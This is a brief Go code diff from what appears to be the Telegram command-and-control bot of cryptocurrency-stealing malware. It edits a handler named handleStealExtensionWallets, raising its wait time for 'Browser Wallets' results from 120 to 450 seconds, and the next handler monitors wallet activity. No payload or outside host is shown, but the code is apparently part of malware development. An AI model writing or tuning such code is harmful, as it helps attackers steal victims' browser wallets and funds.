@@ -2226,7 +2226,7 @@ func (tb *TelegramBot) handleStealExtensionWallets(chatID int64) {
 		taskID[:8],
 	))
 
-	go tb.waitForCryptoResult(chatID, taskID, 120*time.Second, "Browser Wallets")
+	go tb.waitForCryptoResult(chatID, taskID, 450*time.Second, "Browser Wallets")
 }
 
 func (tb *TelegramBot) handleMonitorWalletActivity(chatID int64) {
